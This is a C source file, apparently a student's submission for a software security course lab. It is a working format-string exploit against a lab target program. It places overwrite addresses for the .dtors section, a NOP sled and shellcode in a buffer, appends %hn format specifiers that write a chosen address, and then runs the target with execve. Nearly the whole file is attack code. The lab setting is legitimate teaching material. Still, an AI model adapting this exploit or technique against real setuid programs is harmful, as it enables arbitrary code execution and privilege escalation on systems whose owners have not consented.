/**
CS6332.501
Project 5
Submitted by Konchady Gaurav Shenoy (kxs168430)
**/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
   char *args[3];
   char *env[1];
   char exploit_buffer[500];
   int i=0;
   int stackbase_addr = 0xbffff3f8;
   int dtaddrval = 0x8049578;
   char print_data[] = "%48901x%2$hn%15315x%3$hn";

   do{
      if (i < 4) *(exploit_buffer + i) = (dtaddrval+2) >> (i * 8);
      else if (i < 8) *(exploit_buffer + i) = (dtaddrval) >> ((i - 4) * 8);
      else if (i < (250 - strlen(shellcode))) *(exploit_buffer + i) = '\x90';
      else if (i < 250) *(exploit_buffer + i) = shellcode[i - 250 + strlen(shellcode)];
      else {
         memcpy((exploit_buffer + i), print_data, strlen(print_data));
         break;
      }
      i++;
   }while(i<251);

   args[0] = TARGET; args[1] = exploit_buffer; args[2] = env[0] = NULL;

   //The Moment of Truth
   if (0 > execve(TARGET, args, env))
      fprintf(stderr, "execve failed.\n");

   return 0;
}
